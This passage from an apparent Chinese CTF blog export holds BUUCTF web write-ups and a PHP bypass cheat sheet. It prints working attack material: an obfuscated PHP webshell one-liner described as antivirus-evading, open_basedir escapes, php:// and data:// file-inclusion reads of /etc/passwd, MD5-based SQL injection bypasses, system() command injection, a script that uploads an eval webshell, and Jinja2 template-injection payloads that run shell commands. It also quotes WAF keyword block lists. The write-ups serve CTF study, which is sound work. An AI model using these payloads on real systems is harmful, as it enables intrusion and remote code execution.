&lt;?=$__++?&gt;&lt;?=$________=$__++?&gt;&lt;?=$_________________=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__________=$__++?&gt;&lt;?=$_________=$________.$__________.$________.$_________________.$____.$_____?&gt;&lt;?=($_________)($&#123;'_'.$_______.$______.$________.$_________________&#125;[_])?&gt; // 可做免杀马 不能直接POST提交 会报 Parse error: syntax error, unexpected '&lt;', expecting end of file in// 编码也没用 ![image-20210824104232105](F:\D-学习笔记\BUUCTF WP\image-20210824104232105.png) 绕过 open_basedir/disable_function open_basedir是php.ini中的一个配置选项它可将用户访问文件的活动范围限制在指定的区域，假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。注意用open_basedir指定的限制实际上是前缀,而不是目录名。举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。 payload 1chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);print_r(file_get_contents(&apos;/THis_Is_tHe_F14g&apos;)); 也可以用蚁剑 disable_functions 插件绕过 php伪协议file:// 用于访问文件（绝对路径、相对路径、网络路径） 1http://www.xx.com?file=file:///etc/passswd php:// 访问输入输出流 1http://127.0.0.1/cmd.php?cmd=php://filter/read=convert.base64-encode/resource=[文件名]（针对php文件需要base64编码） 参数 1234resource=&lt;要过滤的数据流&gt; 这个参数是必须的。它指定了你要筛选过滤的数据流read=&lt;读链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。write=&lt;写链的筛选列表&gt; 该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。&lt;；两个链的筛选列表&gt; 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 php://input 12http://127.0.0.1/cmd.php?cmd=php://inputPOST数据：&lt;?php phpinfo()?&gt; 注意：enctype=&quot;multipart/form-data&quot; 的时候 php://input 是无效的 data:// 自PHP&gt;=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输 1http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b 来源：https://www.cnblogs.com/wjrblogs/p/12285202.html extract变量覆盖SESSION验证绕过123456789101112131415&lt;?php$flag = "flag";session_start(); if (isset ($_GET['password'])) &#123; if ($_GET['password'] == $_SESSION['password']) die ('Flag: '.$flag); else print '&lt;p&gt;Wrong guess.&lt;/p&gt;';&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt;# ?password=# 初始状态session为空，因此password也传入空值即可 md5加密相等绕过12345678var_dump(md5('240610708') == md5('QNKCDZO'));var_dump(md5('aabg7XSs') == md5('aabC9RqS'));var_dump(sha1('aaroZmOk') == sha1('aaK1STfY'));var_dump(sha1('aaO8zKZF') == sha1('aa3OFF9m'));var_dump('0010e2' == '1e3');var_dump('0x1234Ab' == '1193131');var_dump('0xABCdef' == ' 0xABCdef');// 都返回 bool(true) md5函数true绕过注入12345678910111213141516171819202122&lt;?php error_reporting(0);$link = mysql_connect('localhost', 'root', 'root');if (!$link) &#123; die('Could not connect to MySQL: ' . mysql_error()); &#125; // 选择数据库$db = mysql_select_db("security", $link);if(!$db)&#123; echo 'select db error'; exit();&#125;// 执行sql$password = $_GET['password'];$sql = "SELECT * FROM users WHERE password = '".md5($password,true)."'";var_dump($sql);$result=mysql_query($sql) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );$row1 = mysql_fetch_row($result);var_dump($row1);mysql_close($link);?&gt; 1234?password=ffifdyop只需md5($password,true)包含&apos; or &apos;xxx这样的字符即可绕过，SQL即变成：SELECT * FROM admin WHERE pass = &apos;&apos; or &apos;xxx&apos;字符串ffifdyop，md5后为276f722736c95d99e921722cf9ed621c，hex转换为字符串为：&apos;or&apos;6&lt;trash&gt; 代码审计绕过特殊案例123456789101112&lt;?phperror_reporting(0);include "flag.php";highlight_file(__file__);if(isset($_GET['args']))&#123; $args = $_GET['args']; if(!preg_match("/^\w+$/",$args))&#123; die("args error!"); &#125; eval("var_dump($$args);");//这里涉及超全局变量的使用&#125;?&gt; 1?args=GLOBALS 通过json_decode特性绕过 1234567891011121314&lt;?phpif (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); $key ="*********"; if ($message-&gt;key == $key) &#123; echo "flag"; &#125; else &#123; echo "fail"; &#125;&#125;else&#123; echo "~~~~";&#125; 1message=&#123;&quot;key&quot;:true&#125; 1234567891011121314151617&lt;?phperror_reporting(0);if (empty($_GET['b'])) &#123; show_source(__FILE__); die();&#125;else&#123; include('flag.php');$a = "www.XMAN.com";$b = $_GET['b'];@parse_str($b);if ($a[0] != 'QNKCDZO' &amp;&amp; md5($a[0]) == md5('QNKCDZO')) &#123; echo $flag;&#125;else&#123;exit('你的答案不对0.0');&#125;&#125;?&gt; 1?b=a[0]=s878926199a 12345678910111213141516171819202122232425262728293031323334&lt;?phpif(isset($_POST['login']))&#123; if(isset($_POST['user'])) &#123; if(@strcmp($_POST['user'],$USER))//USER是被隐藏的复杂用户名 &#123; die('user错误！'); &#125; &#125; if (isset($_POST['name']) &amp;&amp; isset($_POST['password'])) &#123; if ($_POST['name'] == $_POST['password'] ) &#123; die('账号密码不能一致！'); &#125; if (md5($_POST['name']) === md5($_POST['password'])) &#123; if(is_numeric($_POST['id'])&amp;&amp;$_POST['id']!=='72' &amp;&amp; !preg_match('/\s/', $_POST['id'])) &#123; if($_POST['id']==72) die("flag..."); else die("ID错误2！"); &#125; else &#123; die("ID错误1！"); &#125; &#125; else die('账号密码错误！'); &#125;&#125; 123user[]=1&amp;name[]=1&amp;password[]=2&amp;id=72.0&amp;login=Checkoruser[]=1&amp;name[]=1&amp;password[]=2&amp;id=072&amp;login=Check]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [红明谷CTF 2021]write_shell 1]]></title>
    <url>%2F2021%2F10%2F20%2F%5B%E7%BA%A2%E6%98%8E%E8%B0%B7CTF%202021%5Dwrite_shell%201%2F</url>
    <content type="text"><![CDATA[考点&amp;知识点代码审计 解题过程打开直接给源码 123456789101112131415161718192021222324252627282930313233343536 &lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match("/'| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i",$input))&#123; // if(preg_match("/'| |_|=|php/",$input))&#123; die('hacker!!!'); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir))&#123; mkdir($dir);&#125;switch($_GET["action"] ?? "") &#123; case 'pwd': echo $dir; break; case 'upload': $data = $_GET["data"] ?? ""; waf($data); file_put_contents("$dir" . "index.php", $data);&#125;?&gt; 这道题比较简单，可以写入字符进入&#39;sandbox/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &#39;/&#39;生成目录下的index.php文件，但是只过滤了/&#39;| |_|php|;|~|\\^|\\+|eval|{|}/这些关键字，可以使用payload(ph.info)()回显phpinfo信息，过滤了空格，使用%09绕过。 这里直接贴拿flag的payload 回显根目录下文件 1?action=upload&amp;data=&lt;?=(system)(&quot;ls%09/&quot;)?&gt; 1action=upload&amp;data=&lt;?=(system)(&quot;cat%09/flllllll1112222222lag&quot;)?&gt; 总结只要绕过了空格，拿到flag轻而易举，不是很难。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [BJDCTF2020]EzPHP 1]]></title>
    <url>%2F2021%2F10%2F20%2F%5BBJDCTF2020%5DEzPHP%201%2F</url>
    <content type="text"><![CDATA[考点&amp;知识点代码审计 解题过程分析 打开是这个样，不能右键看源代码，通过view-source:的方式查看 得到一串类似于base64的字符串 1GFXEIM3YFZYGQ4A= 猜测是base32,解码得到 11nD3x.php 访问得到 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 &lt;?phphighlight_file(__FILE__);error_reporting(0); $file = "1nD3x.php";$shana = $_GET['shana'];$passwd = $_GET['passwd'];$arg = '';$code = '';echo "&lt;br /&gt;&lt;font color=red&gt;&lt;B&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;";if($_SERVER) &#123; if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING']) ) die('You seem to want to do something bad?'); &#125;if (!preg_match('/http|https/i', $_GET['file'])) &#123; if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123; $file = $_GET["file"]; echo "Neeeeee! Good Job!&lt;br&gt;"; &#125; &#125; else die('fxck you! What do you want to do ?!');if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); &#125; &#125; if (file_get_contents($file) !== 'debu_debu_aqua') die("Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;");if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET["flag"]); echo "Very good! you know my password. But what is flag?&lt;br&gt;";&#125; else&#123; die("fxck you! you don't know my password! And you don't know sha1! why you come here!");&#125;if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) &#123; die("&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); &#125; else &#123; include "flag.php"; $code('', $arg); &#125; ?&gt;This is a very simple challenge and if you solve it I will give you a flag. Good Luck!Aqua is the cutest five-year-old child in the world! Isn't it ? 代码审计这需要绕过的条件比较多，我单独分开列出来。 123if ( preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING']) ) 第一个条件就过滤了需要用到的关键字，这个正则匹配的是$_SERVER[&#39;QUERY_STRING&#39;]里的内容，这个数组变量的值保存的是查询的字符串?query=1&amp;，也就是?后面的字符串。 对参数进行url编码后，拿到的也是编码后的内容，这个正则我们可以通过url编码绕过。 12345if (!preg_match('/http|https/i', $_GET['file'])) &#123; if (preg_match('/^aqua_is_cute$/', $_GET['debu']) &amp;&amp; $_GET['debu'] !== 'aqua_is_cute') &#123; $file = $_GET["file"]; echo "Neeeeee! Good Job!&lt;br&gt;"; &#125; 这里有两个条件，第一个条件过滤了http和https关键字。下面的就是正则字符匹配的双标操作，既要等于这个字符串又不能是这个字符串，遇到/^aqua_is_cute$/，可以在末尾加上%0a，%0a就是换行，就可以绕过。 123456if($_REQUEST) &#123; foreach($_REQUEST as $value) &#123; if(preg_match('/[a-zA-Z]/i', $value)) die('fxck you! I hate English!'); &#125; &#125; 这个正则就有点狠，直接对$_REQUEST数组进行变量，把该数组中所有的属性值都进行正则匹配，不能有字母。以我的思路，到这就做不动了，还是看师傅们的wp，当我们同时提交get和post请求时，这个foreach是以post请求优先进行遍历。此时的$_REQUEST就是post传入的内容，所以这里同时传入file和debu参数即可绕过。(这个如果post跟get请求都有file参数，那么就只会遍历post的file参数) 12if (file_get_contents($file) !== 'debu_debu_aqua') die("Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br&gt;"); 只要绕过了前面几个条件，这个还是比较容易，不能使用http、https，这里可以使用data协议。 1data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE= 1234567if ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123; extract($_GET["flag"]); echo "Very good! you know my password. But what is flag?&lt;br&gt;";&#125; else&#123; die("fxck you! you don't know my password! And you don't know sha1! why you come here!");&#125; 老知识点了，sha1加密的双标操作，数组绕过即可。绕过后，会执行extract函数，这个函数可以进行进行变量覆盖，这里我们需要覆盖的是$code和$arg。 12flag[code]=覆盖$code变量的值flag[arg]=覆盖$arg变量的值 1234567if(preg_match('/^[a-z0-9]*$/isD', $code) || preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) &#123; die("&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); &#125; else &#123; include "flag.php"; $code('', $arg); &#125; 接下来，最后一个条件，也是利用点,$code(&#39;&#39;, $arg);,这里可以使用create_function函数，这里有个下划线，正则匹配的是只能是数字和字母，并且以数字字母开头结尾，直接绕过，create_function函数的利用方式另一篇有讲。另一个条件，可以看到过滤了很多关键字，但是没有过滤var_dump和get_defined_vars函数，这里通过var_dump和get_defined_vars输出全部变量的值。 最终构建的payload 1debu=aqua_is_cute%0a&amp;file=data://text/plain;base64,ZGVidV9kZWJ1X2FxdWE=&amp;shana[]=a&amp;passwd[]=b&amp;flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());// 但是要进行rul编码 get 11nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%73%68%61%6e%61[]=a&amp;%70%61%73%73%77%64[]=b&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;var_dump(get_defined_vars());// post 1file=1&amp;debu=2 回显 再次读取 注意：这里使用system函数执行命令，是没有回显的。 这里使用require函数用php://filter协议进行读取 payload 1require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php) 当然，这里面有很多关键字被过滤掉了，这里对内容进行取反进行url编码得到得到 1%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F 1require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F)) 再次提交 get 11nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;%66%69%6c%65=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%3b%62%61%73%65%36%34%2c%5a%47%56%69%64%56%39%6b%5a%57%4a%31%58%32%46%78%64%57%45%3d&amp;%73%68%61%6e%61[]=a&amp;%70%61%73%73%77%64[]=b&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));// post 1file=1&amp;debu=2 1PGh0bWw+DQo8aGVhZD4NCjxtZXRhIGNoYXJzZXQ9InV0Zi04Ij4NCjxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSI+DQo8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIG1heGltdW0tc2NhbGU9MSwgdXNlci1zY2FsYWJsZT1ubyI+DQo8dGl0bGU+UmVhbF9GbGFnIEluIEhlcmUhISE8L3RpdGxlPg0KPC9oZWFkPg0KPC9odG1sPg0KPD9waHANCgllY2hvICLlkqbvvIzkvaDlsYXnhLbmib7liLDmiJHkuobvvJ/vvIHkuI3ov4fnnIvliLDov5nlj6Xor53kuZ/kuI3ku6PooajkvaDlsLHog73mi7/liLBmbGFn5ZOm77yBIjsNCgkkZjRrZV9mbGFnID0gIkJKRHsxYW1fYV9mYWtlX2Y0MTExMWcyMzMzM30iOw0KCSRyZWExX2YxMTE0ZyA9ICJmbGFnezFhNDM5N2MwLWI5ODctNGU4Mi04NjY3LTJiOGRiNDkyOGJiMn0iOw0KCXVuc2V0KCRyZWExX2YxMTE0Zyk7DQo= 12345678910111213&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no&quot;&gt;&lt;title&gt;Real_Flag In Here!!!&lt;/title&gt;&lt;/head&gt;&lt;/html&gt;&lt;?php echo &quot;å¦ï¼ä½ å±ç¶æ¾å°æäºï¼ï¼ä¸è¿çå°è¿å¥è¯ä¹ä¸ä»£è¡¨ä½ å°±è½æ¿å°flagå¦ï¼&quot;; $f4ke_flag = &quot;BJD&#123;1am_a_fake_f41111g23333&#125;&quot;; $rea1_f1114g = &quot;flag&#123;1a4397c0-b987-4e82-8667-2b8db4928bb2&#125;&quot;; unset($rea1_f1114g); 完成 总结比较喜欢做这类题目，像闯关一样，不仅能学到很多新知识点，还能一步步调试，分析程序执行过程。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [GYCTF2020]EasyThinking 1]]></title>
    <url>%2F2021%2F10%2F20%2F%5BGYCTF2020%5DEasyThinking%201%2F</url>
    <content type="text"><![CDATA[考点&amp;知识点备份文件泄露 ThinkPHP6 任意文件操作漏洞利用 解题过程分析 打开是这个样，有登录、注册、搜索、个人中心这几个功能，各个功能黑盒测试了一遍，均没有发现sql注入，模板注入的漏洞。不过扫目录的时候，扫出来www.zip的文件。 从得到的报错信息中得知使用的是php的tp6框架。 搜了下tp6的rce姿势。很多文章都提到了ThinkPHP6 任意文件操作漏洞。这个漏洞是在存储session时导致的文件写入，如果session可控的话就会照成任意文件操作或者任意文件删除的漏洞。 那这个漏洞要怎么利用呢？首先要找到可以控制session的地方。 在web\app\home\controller\Member.php 123456789101112131415161718192021222324252627282930313233public function search() &#123; if (Request::isPost())&#123; # 判断登录 if (!session('?UID')) &#123; return redirect('/home/member/login'); &#125; $data = input("post."); $record = session("Record"); if (!session("Record")) &#123; // 利用点 session("Record",$data["key"]); &#125; else &#123; $recordArr = explode(",",$record); $recordLen = sizeof($recordArr); if ($recordLen &gt;= 3)&#123; array_shift($recordArr); // 利用点 session("Record",implode(",",$recordArr) . "," . $data["key"]); return View::fetch("result",["res" =&gt; "There's nothing here"]); &#125; &#125; session("Record",$record . "," . $data["key"]); return View::fetch("result",["res" =&gt; "There's nothing here"]); &#125;else&#123; return View("search"); &#125; &#125; 在Member类中找到 search方法，发现有两处可以通过外部传参设置session的值。 getshell接下来注册一个账号，在登录时将cookie改成00000000000000000000000000000.php 总共32位。 然后再搜索框写入webshell 访问 /runtime/session/sess_0000000000000000000000000000.php 回显了123，说明已经写入，接下来蚁剑连接。插件绕过disable_functions，在根目录拿到flag。 总结每一题都能学到新知识点，很不错。这道题跟着师傅们wp倒是做出来了，但是又很多原理性的知识点并没有看懂，代码审计的能力还是比较薄弱，尤其是当多个文件多个类来回看的时候，脑子就是浆糊了，现在就不深入研究了，后面来专门攻克，继续刷题。 参考资料https://paper.seebug.org/1114/#_2 https://www.cnblogs.com/h3ng/p/13758932.html]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>CTF</tag>
        <tag>备份文件泄露</tag>
        <tag>ThinkPHP6任意文件操作漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [NPUCTF2020]ezinclude 1]]></title>
    <url>%2F2021%2F10%2F18%2F%5BNPUCTF2020%5Dezinclude%201%2F</url>
    <content type="text"><![CDATA[考点&amp;知识点md5($secret.$name)===$pass绕过 文件包含（php://filter/string.strip_tags/resource=文件） php7文件上传时Segment Fault,上传的临时文件不会被删除 解题过程打开 源代码中发现 1&lt;!--md5($secret.$name)===$pass --&gt; 这段代码暗示了$secret和$name 的拼接后的字符进行md5加密后的值等于$pass。 这里看师傅们的博客说是经典脑洞。这里的$secret就为Cookiehash的明文，如果要让上面这个条件成立。 $name 可以为空，然后$pass传入 $secret的hash值，这个hash值就在返回头当中。 1http://8c8e609f-51ac-48b8-82ea-0f19cc24e3ea.node4.buuoj.cn:81/?name=&amp;pass=fa25e54758d5d5c1927781a6ede89f8a 这里返回的代码中会跳转到flflflflag.php，实际访问的时候会跳转到404.html。这里的操作只能在burp中完成。 访问flflflflag.php 从返回的代码当中，发现include($_GET[&#39;file])，推测是文件包含，对/etc/passwd包含进行尝试。 验证成功，确实是文件包含，到这里有两种方式可以拿shell，一种是使用data协议，一种是包含日志文件。可惜尝试了包含日志没有回显。无奈之下，看了师傅的博客，发现还有第三种姿势，原理就是，使用php://filter/string.strip_tags/resource=文件让php陷入死循环，产生Segment Fault，如果出现Segment Fault，上传的临时文件就不会被删除，接下来就可以通过，上传一句话，然后将临时文件包含出来，getshell。这个过程需要同时完成，所有这里需要用python脚本一把梭。第三种方式这个大佬讲得更详细些 https://www.cnblogs.com/R3col/p/14929237.html 接下来直接贴脚本 12345678import requestsfrom io import BytesIOurl = "http://8c8e609f-51ac-48b8-82ea-0f19cc24e3ea.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"payload = "&lt;?php eval($_POST['cmd']);?&gt;"file_data = &#123;"file": BytesIO(payload.encode())&#125;res = requests.post(url=url,files=file_data, allow_redirects=False)print(res) 这里可能会报错，多尝试几次就好了。页面会返回404，但是不影响，其实文件已经上传到临时目录下去了。 这里访问dir.php，这里的文件名怎么知道的，扫目录扫出来的。这个文件的功能就是显示临时目录下的文件。 这里可以发现已经上传成功。接下来通过文件包含包含出来。 输出phpinfo 从返回的代码当中就可以知道，执行成功。其实flag就藏在了输出信息当中。 到这里也可以直接用蚁剑去连接，但是需要绕过disable_funcitons，不过使用蚁剑，这还不简单吗? 总结每一题都能学到新知识点，很不错。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>文件包含</tag>
        <tag>脑洞题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [CISCN2019 华东南赛区]Double Secret 1]]></title>
    <url>%2F2021%2F10%2F14%2F%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DDouble%20Secret%201%2F</url>
    <content type="text"><![CDATA[考点模板注入 RC4加密解密 前置知识jinja2 模板注入payload查看指定路径下所有文件 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123;c.__init__.__globals__['__builtins__']['__import__']('os').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 读取文件 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 解题过程分析打开长这样 扫了目录，扫出来robots.txt文件和secret。 robots.txt的内容 没有得到任何提示。 /sectet 太菜了，好像也看不出什么，看了别的师傅wp，可以给secret提交一个secret参数。 当我提交/secret?secret=aaa会回显 可能存在sql注入嫌疑，当我输入&#39;的时候，回显了。 有点奇怪，又看了wp一眼，这道题是模板注入。 当输入secret?secret=abc123的时候，会报错。 可以得知网站是python的flask框架写的。 从报错中得到一部分源码 12345678910111213141516171819if(secret==None): return 'Tell me your secret.I will encrypt it so others can\'t see'rc=rc4_Modified.RC4("HereIsTreasure") #解密deS=rc.do_crypt(secret) a=render_template_string(safe(deS)) if 'ciscn' in a.lower(): return 'flag detected!'return a 到这我又看不懂了，菜鸡果然一步一个坑。得知这是一个RC4的解密功能，并给出了解密密钥HereIsTreasure，a=render_template_string(safe(deS)),这一句，将解密后的明文渲染成字符串，回显出来。这里有一个safe函数，可能是用来过滤某些关键字对的，无从得知。 思路已经知道这是模板注入，那么我们可以把模板注入的payload先进行RC4的加密，然后再传入，看看会有什么效果。 找到一个大师傅的脚本 12345678910111213141516171819202122232425262728293031323334import base64from urllib import parsedef rc4_main(key = "init_key", message = "init_message"):#返回加密后得内容 s_box = rc4_init_sbox(key) crypt = str(rc4_excrypt(message, s_box)) return cryptdef rc4_init_sbox(key): s_box = list(range(256)) j = 0 for i in range(256): j = (j + s_box[i] + ord(key[i % len(key)])) % 256 s_box[i], s_box[j] = s_box[j], s_box[i] return s_boxdef rc4_excrypt(plain, box): res = [] i = j = 0 for s in plain: i = (i + 1) % 256 j = (j + box[i]) % 256 box[i], box[j] = box[j], box[i] t = (box[i] + box[j]) % 256 k = box[t] res.append(chr(ord(s) ^ k)) cipher = "".join(res) return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))key = "HereIsTreasure" #此处为密文message = input("请输入明文:\n")enc_base64 = rc4_main( key , message )enc_init = str(base64.b64decode(enc_base64),'utf-8')enc_url = parse.quote(enc_init)print("rc4加密后的url编码:"+enc_url) 查看根目录文件的payload 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123;c.__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).listdir(&apos;/&apos;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 加密得到 1.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C3%A5nw%C2%A7%C2%8E%C2%BC%C2%BE%C3%BBEy%C2%A9%C2%BBj%C2%83.%5B%18%C3%94%C2%89Y%08%1Aw%22%C3%A3%C3%97%C2%997v%C2%A07%0A%1B%C3%82_%C2%AFN%C2%BF%C2%A3%C2%B8%14%C3%81%C2%AAXy%C3%A5%C3%8D%3B%C2%BCS%0Anq%C2%9D%C2%80%C2%B5%C3%AF%C2%B0%C3%862%5E%22zI%C3%9C%09%C3%85%7BW%C3%A3%C2%99%14gk%C3%A4%C2%BBk%C2%BE%C3%83%C2%B1%0D%03%C3%99%18qu%C2%B4%C2%BCR%C2%81%C2%B1%C2%8E4%C2%A7%C3%A0%C3%8E 回显了根目录下的文件夹，看到flag.txt 读取文件的payload 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;cat /flag.txt&apos;).read()&quot;)&#125;&#125;&#123;% endif 